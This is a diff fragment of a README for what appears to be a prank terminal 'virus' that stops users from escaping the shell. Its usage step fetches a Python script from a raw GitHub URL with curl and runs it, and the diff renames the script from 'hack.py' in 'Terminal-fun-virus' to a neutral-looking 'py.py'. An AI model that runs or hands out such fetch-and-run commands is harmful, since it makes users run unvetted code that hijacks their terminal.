@@ -6,9 +6,9 @@
 * And Stop User From Escaping Shell & User Have To Close Shell
 ### How To Use
 ```
-curl -O https://raw.githubusercontent.com/th3unkn0n/Terminal-fun-virus/master/hack.py
+curl -O https://raw.githubusercontent.com/th3unkn0n/extra-scripts/master/py.py
 
-python3 hack.py
+python3 py.py
 ```
 
 ### & Some Basic Useful Scripts
